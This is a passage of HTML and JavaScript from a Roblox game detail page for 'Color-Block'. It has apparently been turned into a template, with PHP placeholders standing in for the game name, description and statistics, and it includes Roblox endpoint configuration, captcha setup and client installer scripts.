	window.dataLayer = window.dataLayer || [];

	function gtag() {
		dataLayer.push(arguments);
	}
	gtag.conversionEvents = {
		signupConversionEvent: accountCode + '/' + signupConversionEventKey,
		webPurchaseConversionEvent: accountCode + '/' + webPurchaseConversionEventKey
	}
	gtag('set', 'allow_ad_personalization_signals', false);
	gtag('js', new Date());
	gtag('config', accountCode);
	</script>
<script type="text/javascript">
	if(Roblox && Roblox.EventStream) {
		Roblox.EventStream.Init("//ecsv2.roblox.com/www/e.png", "//ecsv2.roblox.com/www/e.png", "//ecsv2.roblox.com/pe?t=studio", "//ecsv2.roblox.com/pe?t=diagnostic");
	}
	</script>
<script type="text/javascript">
	if(Roblox && Roblox.PageHeartbeatEvent) {
		Roblox.PageHeartbeatEvent.Init([2, 8, 20, 60]);
	}
	</script>
<script type="text/javascript">
	if(typeof(Roblox) === "undefined") {
		Roblox = {};
	}
	Roblox.Endpoints = Roblox.Endpoints || {};
	Roblox.Endpoints.Urls = Roblox.Endpoints.Urls || {};
	Roblox.Endpoints.Urls['/asset/'] = 'https://assetgame.roblox.com/asset/';
	Roblox.Endpoints.Urls['/client-status/set'] = 'https://www.roblox.com/client-status/set';
	Roblox.Endpoints.Urls['/client-status'] = 'https://www.roblox.com/client-status';
	Roblox.Endpoints.Urls['/game/'] = 'https://assetgame.roblox.com/game/';
	Roblox.Endpoints.Urls['/game/edit.ashx'] = 'https://assetgame.roblox.com/game/edit.ashx';
	Roblox.Endpoints.Urls['/game/placelauncher.ashx'] = 'https://assetgame.roblox.com/game/placelauncher.ashx';
	Roblox.Endpoints.Urls['/game/preloader'] = 'https://assetgame.roblox.com/game/preloader';
	Roblox.Endpoints.Urls['/game/report-stats'] = 'https://assetgame.roblox.com/game/report-stats';
	Roblox.Endpoints.Urls['/game/report-event'] = 'https://assetgame.roblox.com/game/report-event';
	Roblox.Endpoints.Urls['/game/updateprerollcount'] = 'https://assetgame.roblox.com/game/updateprerollcount';
	Roblox.Endpoints.Urls['/login/default.aspx'] = 'https://www.roblox.com/login/default.aspx';
	Roblox.Endpoints.Urls['/my/avatar'] = 'https://www.roblox.com/my/avatar';
	Roblox.Endpoints.Urls['/my/money.aspx'] = 'https://www.roblox.com/my/money.aspx';
	Roblox.Endpoints.Urls['/navigation/userdata'] = 'https://www.roblox.com/navigation/userdata';
	Roblox.Endpoints.Urls['/chat/chat'] = 'https://www.roblox.com/chat/chat';
	Roblox.Endpoints.Urls['/chat/data'] = 'https://www.roblox.com/chat/data';
	Roblox.Endpoints.Urls['/friends/list'] = 'https://www.roblox.com/friends/list';
	Roblox.Endpoints.Urls['/navigation/getcount'] = 'https://www.roblox.com/navigation/getCount';
	Roblox.Endpoints.Urls['/regex/email'] = 'https://www.roblox.com/regex/email';
	Roblox.Endpoints.Urls['/catalog/browse.aspx'] = 'https://www.roblox.com/catalog/browse.aspx';
	Roblox.Endpoints.Urls['/catalog/html'] = 'https://search.roblox.com/catalog/html';
	Roblox.Endpoints.Urls['/catalog/json'] = 'https://search.roblox.com/catalog/json';
	Roblox.Endpoints.Urls['/catalog/contents'] = 'https://search.roblox.com/catalog/contents';
	Roblox.Endpoints.Urls['/catalog/lists.aspx'] = 'https://search.roblox.com/catalog/lists.aspx';
	Roblox.Endpoints.Urls['/catalog/items'] = 'https://search.roblox.com/catalog/items';
	Roblox.Endpoints.Urls['/asset-hash-thumbnail/image'] = 'https://assetgame.roblox.com/asset-hash-thumbnail/image';
	Roblox.Endpoints.Urls['/asset-hash-thumbnail/json'] = 'https://assetgame.roblox.com/asset-hash-thumbnail/json';
	Roblox.Endpoints.Urls['/asset-thumbnail-3d/json'] = 'https://assetgame.roblox.com/asset-thumbnail-3d/json';
	Roblox.Endpoints.Urls['/asset-thumbnail/image'] = 'https://assetgame.roblox.com/asset-thumbnail/image';
	Roblox.Endpoints.Urls['/asset-thumbnail/json'] = 'https://assetgame.roblox.com/asset-thumbnail/json';
	Roblox.Endpoints.Urls['/asset-thumbnail/url'] = 'https://assetgame.roblox.com/asset-thumbnail/url';
	Roblox.Endpoints.Urls['/asset/request-thumbnail-fix'] = 'https://assetgame.roblox.com/asset/request-thumbnail-fix';
	Roblox.Endpoints.Urls['/avatar-thumbnail-3d/json'] = 'https://www.roblox.com/avatar-thumbnail-3d/json';
	Roblox.Endpoints.Urls['/avatar-thumbnail/image'] = 'https://www.roblox.com/avatar-thumbnail/image';
	Roblox.Endpoints.Urls['/avatar-thumbnail/json'] = 'https://www.roblox.com/avatar-thumbnail/json';
	Roblox.Endpoints.Urls['/avatar-thumbnails'] = 'https://www.roblox.com/avatar-thumbnails';
	Roblox.Endpoints.Urls['/avatar/request-thumbnail-fix'] = 'https://www.roblox.com/avatar/request-thumbnail-fix';
	Roblox.Endpoints.Urls['/bust-thumbnail/json'] = 'https://www.roblox.com/bust-thumbnail/json';
	Roblox.Endpoints.Urls['/headshot-thumbnail/json'] = 'https://www.roblox.com/headshot-thumbnail/json';
	Roblox.Endpoints.Urls['/item-thumbnails'] = 'https://www.roblox.com/item-thumbnails';
	Roblox.Endpoints.Urls['/outfit-thumbnail/json'] = 'https://www.roblox.com/outfit-thumbnail/json';
	Roblox.Endpoints.Urls['/place-thumbnails'] = 'https://www.roblox.com/place-thumbnails';
	Roblox.Endpoints.Urls['/thumbnail/asset/'] = 'https://www.roblox.com/thumbnail/asset/';
	Roblox.Endpoints.Urls['/thumbnail/avatar-headshot'] = 'https://www.roblox.com/thumbnail/avatar-headshot';
	Roblox.Endpoints.Urls['/thumbnail/avatar-headshots'] = 'https://www.roblox.com/thumbnail/avatar-headshots';
	Roblox.Endpoints.Urls['/thumbnail/user-avatar'] = 'https://www.roblox.com/thumbnail/user-avatar';
	Roblox.Endpoints.Urls['/thumbnail/resolve-hash'] = 'https://www.roblox.com/thumbnail/resolve-hash';
	Roblox.Endpoints.Urls['/thumbnail/place'] = 'https://www.roblox.com/thumbnail/place';
	Roblox.Endpoints.Urls['/thumbnail/get-asset-media'] = 'https://www.roblox.com/thumbnail/get-asset-media';
	Roblox.Endpoints.Urls['/thumbnail/remove-asset-media'] = 'https://www.roblox.com/thumbnail/remove-asset-media';
	Roblox.Endpoints.Urls['/thumbnail/set-asset-media-sort-order'] = 'https://www.roblox.com/thumbnail/set-asset-media-sort-order';
	Roblox.Endpoints.Urls['/thumbnail/place-thumbnails'] = 'https://www.roblox.com/thumbnail/place-thumbnails';
	Roblox.Endpoints.Urls['/thumbnail/place-thumbnails-partial'] = 'https://www.roblox.com/thumbnail/place-thumbnails-partial';
	Roblox.Endpoints.Urls['/thumbnail_holder/g'] = 'https://www.roblox.com/thumbnail_holder/g';
	Roblox.Endpoints.Urls['/users/{id}/profile'] = 'https://www.roblox.com/users/{id}/profile';
	Roblox.Endpoints.Urls['/service-workers/push-notifications'] = 'https://www.roblox.com/service-workers/push-notifications';
	Roblox.Endpoints.Urls['/notification-stream/notification-stream-data'] = 'https://www.roblox.com/notification-stream/notification-stream-data';
	Roblox.Endpoints.Urls['/api/friends/acceptfriendrequest'] = 'https://www.roblox.com/api/friends/acceptfriendrequest';
	Roblox.Endpoints.Urls['/api/friends/declinefriendrequest'] = 'https://www.roblox.com/api/friends/declinefriendrequest';
	Roblox.Endpoints.Urls['/authentication/is-logged-in'] = 'https://www.roblox.com/authentication/is-logged-in';
	Roblox.Endpoints.addCrossDomainOptionsToAllRequests = true;
	</script>
<script type="text/javascript">
	if(typeof(Roblox) === "undefined") {
		Roblox = {};
	}
	Roblox.Endpoints = Roblox.Endpoints || {};
	Roblox.Endpoints.Urls = Roblox.Endpoints.Urls || {};
	</script>
<script>
	Roblox = Roblox || {};
	Roblox.AbuseReportPVMeta = {
		desktopEnabled: false,
		phoneEnabled: false,
		inAppEnabled: false
	};
	</script>
<meta name="thumbnail-meta-data" data-is-webapp-cache-enabled="False" data-webapp-cache-expirations-timespan="00:01:00" data-request-min-cooldown="1000" data-request-max-cooldown="30000" data-request-max-retry-attempts="3" data-request-batch-size="100" data-thumbnail-metrics-sample-size="20" data-concurrent-thumbnail-request-count="4" /> </head>
<body id="rbx-body" class="rbx-body   light-theme gotham-font" data-performance-relative-value="0.005" data-internal-page-name="GameDetail" data-send-event-percentage="0">
<meta name="csrf-token" data-token="0gVG6whlUopW" />
<script src="https://roblox.com/js/hsts.js?v=1" type="text/javascript" id="hsts" async></script>
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Linkify" data-bundle-source="Main" src="https://js.rbxcdn.com/d66f9bed66403723f7f1a143a2776681aef19dcf1fce1173e4f58a5cb8bd205e.js"></script>
<div id="image-retry-data" data-image-retry-max-times="30" data-image-retry-timer="500" data-ga-logging-percent="10"> </div>
<div id="http-retry-data" data-http-retry-max-timeout="0" data-http-retry-base-timeout="0" data-http-retry-max-times="1"> </div>
<div id="wrap" class="wrap no-gutter-ads logged-out" data-gutter-ads-enabled="false">
<div id="SocialIdentitiesInformation" data-rbx-login-redirect-url="/social/postlogin" data-context="loginDropdown"> </div>
<script src="https://roblox-api.arkoselabs.com/fc/api/?onload=reportFunCaptchaLoaded" async onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportResourceError('funcaptcha')"></script>
<script type="text/javascript">
		var Roblox = Roblox || {};
		$(function() {
			var funCaptcha = Roblox.FunCaptcha;
			if(funCaptcha) {
				var captchaTypes = [{
					"Type": "Login",
					"PublicKey": "9F35E182-C93C-EBCC-A31D-CF8ED317B996",
					"ApiUrl": "https://captcha.roblox.com/v1/funcaptcha/login/web"
				}];
				funCaptcha.addCaptchaTypes(captchaTypes, true);
				funCaptcha.setMaxRetriesOnTokenValidationFailure(0);
				funCaptcha.setPerAppTypeLoggingEnabled(false);
				funCaptcha.setRetryIntervalRange(500, 1500);
			}
		});
		// Necessary because of how FunCaptcha js executes callback
		// i.e. window["{function name}"]
		function reportFunCaptchaLoaded() {
			if(Roblox.BundleDetector) {
				Roblox.BundleDetector.reportResourceLoaded("funcaptcha");
			}
		}
		</script>
<div id="navigation-container" class="light-theme gotham-font" data-number-of-autocomplete-suggestions="7" data-is-redirect-library-to-creator-marketplace-enabled="True">
<div id="header" class="navbar-fixed-top rbx-header" role="navigation">
<div class="container-fluid">
<div class="rbx-navbar-header">
<div id="header-menu-icon" class="rbx-nav-collapse">
<button type="button" class="btn-navigation-nav-menu-md menu-button"> <span class="icon-nav-menu"></span> </button>
</div>
<div class="navbar-header">
<a class="navbar-brand" href="/home"> <span class="icon-logo"></span><span class="icon-logo-r"></span> </a>
</div>
</div>
<ul class="nav rbx-navbar hidden-xs hidden-sm col-md-5 col-lg-4">
<li> <a class="font-header-2 nav-menu-title text-header" href="/discover">Discover</a> </li>
<li> <a class="font-header-2 nav-menu-title text-header" href="/catalog">Avatar Shop</a> </li>
<li> <a class="font-header-2 nav-menu-title text-header" href="/develop">Create</a> </li>
<li> <a class="font-header-2 nav-menu-title text-header" href="/robux?ctx-nav">Robux</a> </li>
</ul>
<ul class="nav rbx-navbar hidden-md hidden-lg col-xs-12">
<li> <a class="font-header-2 nav-menu-title text-header" href="/discover">Discover</a> </li>
<li> <a class="font-header-2 nav-menu-title text-header" href="/catalog">Avatar Shop</a> </li>
<li> <a class="font-header-2 nav-menu-title text-header" href="/develop">Create</a> </li>
<li> <a class="font-header-2 nav-menu-title text-header" href="/robux?ctx=nav">Robux</a> </li>
</ul>
<div id="right-navigation-header"></div>
</div>
</div>
<div id="left-navigation-container"></div>
<div id="verificationUpsell-container">
<div verificationUpsell-container></div>
</div>
<div id="phoneVerificationUpsell-container">
<div phoneVerificationUpsell-container></div>
</div>
<div id="contactMethodPrompt-container">
<div contactMethodPrompt-container></div>
</div>
</div>
<script type="text/javascript">
		var Roblox = Roblox || {};
		(function() {
			if(Roblox && Roblox.Performance) {
				Roblox.Performance.setPerformanceMark("navigation_end");
			}
		})();
		</script>
<div class="container-main 
                
                
                
                
                
                " id="container-main" tabindex="-1">
<script type="text/javascript">
			if(top.location != self.location) {
				top.location = self.location.href;
			}
			</script>
<div class="alert-container">
<noscript>
					<div>
						<div class="alert-info" role="alert">Please enable Javascript to use all the features on this site.</div>
					</div>
				</noscript>
</div>
<div class="content">
<div id="Leaderboard-Abp" class="abp leaderboard-abp">
<iframe name="Roblox_GameDetail_Top_728x90" allowtransparency="true" frameborder="0" height="110" scrolling="no" data-src="" src="/user-sponsorship/1" width="728" data-js-adtype="iframead" data-ad-slot="Roblox_GameDetail_Top_728x90"></iframe>
</div>
<div id="game-detail-page" class="row page-content inline-social" data-place-id="5926001758">
<div id="game-detail-meta-data" data-universe-id="<?=$universeid;?>" data-place-id="5926001758" data-place-name="<?=$info->Name;?>" data-page-id="fec90957-4670-4880-96ca-168dcab01c4b" data-root-place-id="5926001758" data-show-shut-down-all-button="False" data-user-can-manage-place="False" data-private-server-price="300" data-can-create-server="False" data-private-server-limit="2147483647" data-seller-name="Lightning Dragon Studio" data-seller-id="12420072" data-private-server-product-id="1233548280" data-private-server-link-code="" data-preopen-create-private-server-modal="False" data-experience-invite-link-id="" data-experience-invite-status="" data-can-copy-place="False" class="hidden"></div>
<div class="system-feedback">
<div class="alert-system-feedback">
<div class="alert alert-success">Purchase Completed</div>
</div>
<div class="alert-system-feedback">
<div class="alert alert-warning">Error occurred</div>
</div>
</div>
<div class="col-xs-12 section-content game-main-content remove-panel follow-button-enabled">
<div id="game-details-carousel-container" class="game-details-carousel-container"></div>
<div class="game-calls-to-action">
<div class="game-title-container">
<h1 class="game-name" title="<?=$info->Name;?>"><?=$info->Name;?></h1>
<div class="game-creator"><span class='text-label'>By</span> <a class='text-name'><?=$info->Builder;?></a></div>
<div id="game-age-recommendation-container"></div> <span id="2sv-popup-container"></span> </div>
<div class="game-buttons-container">
<div id="game-details-play-button-container" class="game-details-play-button-container"> <span class="spinner spinner-default"></span> </div>

<ul class="favorite-follow-vote-share">
<li class="game-favorite-button-container">
<div class="tooltip-container" data-toggle="tooltip" title="" data-original-title="Add to Favorites">
<div class="favorite-button">
<a id="toggle-game-favorite" data-toggle-url="/favorite/toggle" data-assetid="5926001758" data-isguest="True" data-signin-url="/login?returnUrl=<?=$returnUrl;?>">
<div id="game-favorite-icon" class="icon-favorite "></div>
<div id="game-favorite-icon-label" class="icon-label">Favorite</div>
</a>
</div>
</div>
</li>
<li class="game-follow-button-container">
<div class="tooltip-container" data-toggle="tooltip" title="" data-original-title="">
<div class="follow-button">
<a id="toggle-game-follow" data-universe-id="<?=$universeid;?>" data-is-guest="true" data-signin-url="/login?returnUrl=<?=$returnUrl;?>" data-user-id="0" data-originator="" data-originator-id="">
<div id="game-follow-icon" class="icon-follow-game"></div>
<div id="game-follow-icon-label" class="icon-label">Follow</div>
</a>
</div>
</div>
</li>
<li id="voting-container" class="voting-panel"> <span class="game-voting-panel spinner spinner-default"></span> </li>
<li class="social-media-share"> </li>

</ul>
</div>
</div>
<div id="game-details-invite-link-expired-modal-container"></div>
</div>
<div class="col-xs-12 rbx-tabs-horizontal" data-place-id="5926001758">
<ul id="horizontal-tabs" class="nav nav-tabs" role="tablist">
<li id="tab-about" class="rbx-tab tab-about active">
<a class="rbx-tab-heading" href="#about"> <span class="text-lead">About</span> </a>
</li>
<li id="tab-store" class="rbx-tab tab-store">
<a class="rbx-tab-heading" href="#store"> <span class="text-lead">Store</span> </a>
</li>
<li id="tab-game-instances" class="rbx-tab tab-game-instances">
<a class="rbx-tab-heading" href="#game-instances"> <span class="text-lead">Servers</span> </a>
</li>
</ul>
<div class="tab-content rbx-tab-content">
<div class="tab-pane active" id="about">
<div class="section game-about-container">
<div class="container-header">
<h2>Description</h2> </div>
<div class="section-content remove-panel"> <pre class="text game-description linkify"><?=$info->Name;?><?=$info->Description;?>
</pre>
<div id="game-age-recommendation-details"></div>
<ul class="border-top border-bottom game-stats-container follow-button-enabled">
<li class="game-stat game-stat-width">
<p class="text-label text-overflow font-caption-header">Active</p>
<p class="text-lead font-caption-body wait-for-i18n-format-render "><?=number_format($info->OnlineCount);?></p>
</li>
 <li class="game-stat game-stat-width">
<p class="text-label text-overflow font-caption-header">Favorites</p>
<p class="text-lead font-caption-body wait-for-i18n-format-render "><span class="game-favorite-count"><?=number_format($info->FavoritedCount);?></span></p>
</li>
<li class="game-stat game-stat-width">
<p class="text-label text-overflow font-caption-header">Visits</p>
<p id="game-visit-count" class="text-lead font-caption-body wait-for-i18n-format-render " title="<?=$info->VisitedCount;?>"><?=number_format_short($info->VisitedCount);?></p>
</li>
<li class="game-stat game-stat-width">
<p class="text-label text-overflow font-caption-header">Created</p>
<p class="text-lead font-caption-body"><?=$info->Created;?></p>
</li>
<li class="game-stat game-stat-width">
<p class="text-label text-overflow font-caption-header">Updated</p>
<p class="text-lead font-caption-body"><?=$info->Created;?></p>
</li>
<li class="game-stat game-stat-width">
<p class="text-label text-overflow font-caption-header">Server Size</p>
<p class="text-lead font-caption-body wait-for-i18n-format-render "><?=$info->MaxPlayers;?></p>
</li>
<li class="game-stat game-stat-width">
<p class="text-label text-overflow font-caption-header">Genre</p>
<p class="text-lead font-caption-body wait-for-i18n-format-render ">All Genres</p>
</li>
<li class="game-stat game-stat-width">
<p class="text-label text-overflow font-caption-header">Allowed Gear</p>
<p class="text-lead font-caption-body stat-gears"> <span class="icon-nogear" data-toggle="tooltip" data-original-title="No Gear Allowed"></span> </p>
</li>
</ul>
<div class="game-stat-footer"> <span class="game-report-abuse"><a class="text-report abuse-report-modal" href="https://www.roblox.com/abusereport/asset?id=5926001758&amp;RedirectUrl=%2fgames%2f5926001758%2fColor-Block">Report Abuse</a></span> </div>
</div>
</div>
<div id="private-server-container-about-tab"></div>
<div id="game-badges-container">
<game-badges-list universe-id="<?=$universeid;?>"></game-badges-list>
</div>
<script>
								var Roblox = Roblox || {};
								Roblox.GameDetail = Roblox.GameDetail || {};
								Roblox.GameDetail.UniverseId = <?=$universeid;?>;
								</script>
<div id="recommended-games-container" class="container-list games-detail"></div>
</div>
<div class="tab-pane store" id="store">
<input name="__RequestVerificationToken" type="hidden" value="PuWgb621ZZRTwmX2VBPNWaP2emXaMfB_uWxBOj1Gt6uarlKmqQQ1sF4qz5Je1dSF32ZT3S78viSFr_wF9jqghYfGWcE1" />
<div id="rbx-game-passes" class="container-list game-dev-store game-passes">
<div class="container-header">
<h3>Passes</h3> </div>
<ul id="rbx-passes-container" class="hlist store-cards gear-passes-container"> </ul>
</div>
<li class='list-item rbx-passes-item-container rbx-gear-passes-item-add' id='spinner' style="display: none;"> <span class="spinner spinner-default"></span> </li>
<script>
								$(function() {
									Roblox.GamePassJSData = Roblox.GamePassJSData || {};
									Roblox.GamePassJSData.PlaceID = 5926001758;
									Roblox.GamePassJSData.GamePassesPerPlaceLimit = 50;
									Roblox.GamePassJSData.LabelBuy = "Buy";
									Roblox.GamePassJSData.LabelOwned = "Owned";
									Roblox.GamePassJSData.DataAssetType = "Game Pass";
									var purchaseConfirmationCallback = function(obj) {
										var originalContainer = $('.PurchaseButton[data-item-id=' + obj.AssetID + ']').parent('.store-card-caption');
										originalContainer.find('.rbx-purchased').hide();
										originalContainer.find('.rbx-item-buy').show();
									};
									Roblox.GamePassItemPurchase = new Roblox.ItemPurchase(purchaseConfirmationCallback);
									$("#store #rbx-game-passes, #all-purchasable-items #rbx-game-passes").on("click", ".PurchaseButton", function(e) {
										Roblox.GamePassItemPurchase.openPurchaseVerificationView($(this), 'game-pass');
									});
									$("#store #rbx-game-passes .btn-more, #all-purchasable-items #rbx-game-passes .btn-more").on("click", function(e) {
										$("#rbx-game-passes #rbx-passes-container").toggleClass("collapsed");
									});
									$(".rbx-tab a[href='#store']").one('shown.bs.tab', function() {
										Roblox.GamePassLazyLoading.init();
									});
									var checkForImmediateLoading = function() {
										var loadImmediatelyData = $("#all-purchasable-items").data('load-immediately');
										if(parseInt(loadImmediatelyData) > 0) {
											Roblox.GamePassLazyLoading.init();
										}
									}
									checkForImmediateLoading();
								});
								</script>
</div>
<div class="tab-pane game-instances" id="game-instances">
<div class="col-xs-12 section-content-off">There are currently no running experiences.</div>
</div>
</div>
</div>
</div>
<div class="GenericModal modalPopup unifiedModal smallModal" style="display:none;">
<div class="Title"></div>
<div class="GenericModalBody">
<div>
<div class="ImageContainer"> <img class="GenericModalImage" alt="generic image" /> </div>
<div class="Message"></div>
</div>
<div class="clear"></div>
<div id="GenericModalButtonContainer" class="GenericModalButtonContainer"> <a class="ImageButton btn-neutral btn-large roblox-ok">OK</a> </div>
</div>
</div>
<div id="ItemPurchaseAjaxData" data-has-currency-service-error="False" data-currency-service-error-message="" data-authenticateduser-isnull="True" data-user-balance-robux="0" data-user-bc="0" data-continueshopping-url="https://www.roblox.com/games/5926001758/Color-Block" data-imageurl="https://t6.rbxcdn.com/a5bc618cbb4d5d8cb4a70124046d23ca" data-alerturl="https://images.rbxcdn.com/b7353602bbf9b927d572d5887f97d452.svg" data-inSufficentFundsurl="https://images.rbxcdn.com/b80339ddf867ccfe6ab23a2c263d8000.png" data-is-bc-only-requirement-enabled="False" data-is-plugins-purchasing-enabled="True" data-is-modal-footer-centered-enabled="True"> </div>
<script type="text/javascript">
				var Roblox = Roblox || {};
				Roblox.GamePassJSData = Roblox.GamePassJSData || {};
				Roblox.GamePassJSData.LabelGameDoesNotSell = "No passes available.";
				$(function() {
					if(Roblox.Voting) {
						Roblox.Voting.LoadVotingService($("#voting-container"), 5926001758);
					}
				});
				</script>
<div id="Skyscraper-Abp-Right" class="abp abp-container right-abp">
<iframe name="Roblox_GameDetail_Right_160x600" allowtransparency="true" frameborder="0" height="612" scrolling="no" data-src="" src="/user-sponsorship/2" width="160" data-js-adtype="iframead" data-ad-slot="Roblox_GameDetail_Right_160x600"></iframe>
</div>
</div>
</div>

<footer class="container-footer" id="footer-container" data-is-giftcards-footer-enabled="True"> </footer>
</div>
<div id="user-agreements-checker-container"></div>
<div id="cookie-banner-wrapper" class="cookie-banner-wrapper"></div>
<script type="text/javascript">
	function urchinTracker() {}
	</script>
<script type="text/javascript">
	if(typeof Roblox === "undefined") {
		Roblox = {};
	}
	if(typeof Roblox.PlaceLauncher === "undefined") {
		Roblox.PlaceLauncher = {};
	}
	var isRobloxIconEnabledForRetheme = "True";
	var robloxIcon = isRobloxIconEnabledForRetheme === 'True' ? "<span class='icon-logo-r-95'></span>" : "<img src='https://images.rbxcdn.com/8e7879f99cfa7cc3b1fce74f8191be03.svg' width='90' height='90' alt='R'/>";
	Roblox.PlaceLauncher.Resources = {
		RefactorEnabled: "True",
		IsProtocolHandlerBaseUrlParamEnabled: "False",
		ProtocolHandlerAreYouInstalled: {
			play: {
				content: robloxIcon + "<p>You&#39;re moments away from getting into the experience!</p>",
				buttonText: "Download and Install Roblox",
				footerContent: "<a href='https://assetgame.roblox.com/game/help'class= 'text-name small' target='_blank' >Click here for help</a> "
			},
			studio: {
				content: "<img src='https://images.rbxcdn.com/f25e4cadae29ae9a57a962126b2d2e2a.png' width='95' height='95' alt='R' /><p>Get started creating your own experiences!</p>",
				buttonText: "Download Studio"
			}
		},
		ProtocolHandlerStartingDialog: {
			play: {
				content: robloxIcon + "<p>Roblox is now loading. Get ready!</p>"
			},
			studio: {
				content: "<img src='https://images.rbxcdn.com/f25e4cadae29ae9a57a962126b2d2e2a.png' width='95' height='95' alt='R' /><p>Checking for Roblox Studio...</p>"
			},
			loader: "<span class='spinner spinner-default'></span>"
		}
	};
	</script>
<div id="PlaceLauncherStatusPanel" style="display:none;width:300px" data-new-plugin-events-enabled="True" data-event-stream-for-plugin-enabled="True" data-event-stream-for-protocol-enabled="True" data-is-studio-auth-ticket-enabled="True" data-is-studio-sso-params-enabled="True" data-is-game-launch-interface-enabled="True" data-is-protocol-handler-launch-enabled="True" data-is-duar-auto-opt-in-enabled="false" data-is-duar-opt-out-disabled="false" data-is-user-logged-in="False" data-os-name="Windows" data-protocol-name-for-client="roblox-player" data-protocol-name-for-studio="roblox-studio" data-protocol-roblox-locale="en_us" data-protocol-game-locale="en_us" data-protocol-url-includes-launchtime="true" data-protocol-detection-enabled="true" data-protocol-separate-script-parameters-enabled="true" data-protocol-avatar-parameter-enabled="false" data-protocol-channel-name="LIVE" data-protocol-studio-channel-name="LIVE" data-protocol-player-channel-name="LIVE">
<div class="modalPopup blueAndWhite PlaceLauncherModal" style="min-height: 160px">
<div id="Spinner" class="Spinner" style="padding:20px 0;"> <img data-delaysrc="https://images.rbxcdn.com/e998fb4c03e8c2e30792f2f3436e9416.gif" height="32" width="32" alt="Progress" /> </div>
<div id="status" style="min-height:40px;text-align:center;margin:5px 20px">
<div id="Starting" class="PlaceLauncherStatus MadStatusStarting" style="display:block"> Starting Roblox... </div>
<div id="Waiting" class="PlaceLauncherStatus MadStatusField">Connecting to People...</div>
<div id="StatusBackBuffer" class="PlaceLauncherStatus PlaceLauncherStatusBackBuffer MadStatusBackBuffer"></div>
</div>
<div style="text-align:center;margin-top:1em">
<input type="button" class="Button CancelPlaceLauncherButton translate" value="Cancel" /> </div>
</div>
</div>
<div id="ProtocolHandlerClickAlwaysAllowed" class="ph-clickalwaysallowed" style="display:none;">
<p class="larger-font-size"> <span class="icon-moreinfo"></span> Check <strong>Always open links for URL: Roblox Protocol</strong> and click <strong>Open URL: Roblox Protocol</strong> in the dialog box above to join experiences faster in the future! </p>
</div>
<script type="text/javascript">
	function checkRobloxInstall() {
		return RobloxLaunch.CheckRobloxInstall('https://www.roblox.com/Download');
	}
	</script>
<div id="InstallationInstructions" class="" style="display:none;">
<div class="ph-installinstructions">
<div class="ph-modal-header"> <span class="icon-close simplemodal-close"></span>
<h3 class="title">Thanks for visiting Roblox</h3> </div>
<div class="modal-content-container">
<div class="ph-installinstructions-body ">
<ul class="modal-col-4">
<li class="step1-of-4">
<h2>1</h2>
<p class="larger-font-size">Click <strong>RobloxPlayer.exe</strong> to run the Roblox installer, which just downloaded via your web browser.</p>
<div style="margin-top:60px"> <img data-delaysrc="https://images.rbxcdn.com/bcf5d84d4469c075e6296bfbc4deabb1" /> </div>
</li>
<li class="step2-of-4">
<h2>2</h2>
<p class="larger-font-size">Click <strong>Run</strong> when prompted by your computer to begin the installation process.</p> <img data-delaysrc="https://images.rbxcdn.com/51328932dedb5d8d61107272cc1a27db.png" /> </li>
<li class="step3-of-4">
<h2>3</h2>
<p class="larger-font-size">Click <strong>Ok</strong> once you've successfully installed Roblox.</p> <img data-delaysrc="https://images.rbxcdn.com/bbdb38de8bb89ecc07730b41666a26a4" /> </li>
<li class="step4-of-4">
<h2>4</h2>
<p class="larger-font-size">After installation, click <strong>Join</strong> below to join the action!</p>
<div class="VisitButton VisitButtonContinueGLI"> <a class="btn btn-primary-lg disabled btn-full-width">Join</a> </div>
</li>
</ul>
</div>
</div>
<div class="xsmall"> The Roblox installer should download shortly. If it doesn’t, start the <a id="GameLaunchManualInstallLink" href="#" class="text-link">download now.</a> </div>
</div>
</div>
<div class="InstallInstructionsImage" data-modalwidth="970" style="display:none;"></div>
<div id="pluginObjDiv" style="height:1px;width:1px;visibility:hidden;position: absolute;top: 0;"></div>
<iframe id="downloadInstallerIFrame" name="downloadInstallerIFrame" style="visibility:hidden;height:0;width:1px;position:absolute"></iframe>
<script onerror='Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)' data-monitor='true' data-bundlename='clientinstaller' type='text/javascript' src='https://js.rbxcdn.com/f424a786e3d883cff747a034605fa09d.js'></script>
<script type="text/javascript">
	Roblox.Client._skip = null;
	Roblox.Client._CLSID = '76D50904-6780-4c8b-8986-1A7EE0B1716D';
	Roblox.Client._installHost = 'setup.roblox.com';
	Roblox.Client.ImplementsProxy = true;
	Roblox.Client._silentModeEnabled = true;
	Roblox.Client._bringAppToFrontEnabled = false;
	Roblox.Client._currentPluginVersion = '';
	Roblox.Client._eventStreamLoggingEnabled = true;
	Roblox.Client._installSuccess = function() {
		if(GoogleAnalyticsEvents) {
			GoogleAnalyticsEvents.ViewVirtual('InstallSuccess');
			GoogleAnalyticsEvents.FireEvent(['Plugin', 'Install Success']);
			if(Roblox.Client._eventStreamLoggingEnabled && typeof Roblox.GamePlayEvents != "undefined") {
				Roblox.GamePlayEvents.SendInstallSuccess(Roblox.Client._launchMode, play_placeId);
			}
		}
	}
	if((window.chrome || window.safari) && window.location.hash == '#chromeInstall') {
		window.location.hash = '';
		var continuation = '(' + $.cookie('chromeInstall') + ')';
		play_placeId = $.cookie('chromeInstallPlaceId');
		Roblox.GamePlayEvents.lastContext = $.cookie('chromeInstallLaunchMode');
		$.cookie('chromeInstallPlaceId', null);
		$.cookie('chromeInstallLaunchMode', null);
		$.cookie('chromeInstall', null);
		RobloxLaunch._GoogleAnalyticsCallback = function() {
			var isInsideRobloxIDE = 'website';
			if(Roblox && Roblox.Client && Roblox.Client.isIDE && Roblox.Client.isIDE()) {
				isInsideRobloxIDE = 'Studio';
			};
			GoogleAnalyticsEvents.FireEvent(['Plugin Location', 'Launch Attempt', isInsideRobloxIDE]);
			GoogleAnalyticsEvents.FireEvent(['Plugin', 'Launch Attempt', 'Play']);
			EventTracker.fireEvent('GameLaunchAttempt_Win32', 'GameLaunchAttempt_Win32_Plugin');
			if(typeof Roblox.GamePlayEvents != 'undefined') {
				Roblox.GamePlayEvents.SendClientStartAttempt(null, play_placeId);
			}
		};
		Roblox.Client.ResumeTimer(eval(continuation));
	}
	</script>
<div class="ConfirmationModal modalPopup unifiedModal smallModal" data-modal-handle="confirmation" style="display:none;">
<a class="genericmodal-close ImageButton closeBtnCircle_20h"></a>
<div class="Title"></div>
<div class="GenericModalBody">
<div class="TopBody">
<div class="ImageContainer roblox-item-image" data-image-size="small" data-no-overlays data-no-click> <img class="GenericModalImage" alt="generic image" /> </div>
